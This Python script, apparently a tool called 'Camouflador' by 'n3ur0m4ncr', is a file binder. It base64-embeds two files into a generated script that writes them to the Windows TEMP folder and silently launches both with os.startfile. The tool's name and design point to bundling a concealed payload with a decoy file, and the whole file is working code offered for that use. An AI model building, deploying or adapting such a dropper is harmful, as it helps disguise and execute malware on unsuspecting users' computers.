import sys
import os
import base64

BLUE = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan = "\033[96m"
END = '\033[0m'

if len(sys.argv) < 2:
    print(RED + """  

 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                    
                                                                                                    
                                                                                                                                                                                                                                             
    """ + END + BLUE + 'GitHub: https://github.com/n3ur0m4ncr'.format(RED, END).center(69) +
          '\n' + '\tAutor: {}n3ur0m4ncr'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
          '\n' + '\tVersion: {}2.0{}'.format(YELLOW, END).center(80) + '\n')

arquivo1 = input('Primeiro arquivo: ')  # 1
arquivo2 = input('Segundo arquivo: ')  # 2

nomeArquivo1 = os.path.basename(arquivo1)  # 3
nomeArquivo2 = os.path.basename(arquivo2)  # 4

with open(arquivo1, 'rb') as arquivo1Aberto, \
        open(arquivo2, 'rb') as arquivo2Aberto, \
        open('arquivoFinal.py', 'w') as arquivo_gerado:  # 5

    arquivo_gerado.write('''import os, base64  # 6
def join(conteudoBinario, nomeArquivo):  # 7
    if not os.path.exists(os.environ["TEMP"] + "\\\\" + nomeArquivo):  # 8
        with open(os.environ["TEMP"] + "\\\\" + nomeArquivo, "wb") as arquivoTemporario:  # 9
            arquivoTemporario.write(conteudoBinario)  # 10
    os.startfile(os.environ["TEMP"] + "\\\\" + nomeArquivo)  # 11
arquivo1base64 = "{}"  # 12
join(base64.b64decode(arquivo1base64), "{}")  # 13
arquivo2base64 = "{}"  # 14
join(base64.b64decode(arquivo2base64), "{}")  # 15
'''.format(base64.b64encode(arquivo1Aberto.read()).decode('utf-8'), nomeArquivo1,
           base64.b64encode(arquivo2Aberto.read()).decode('utf-8'), nomeArquivo2))  # 16
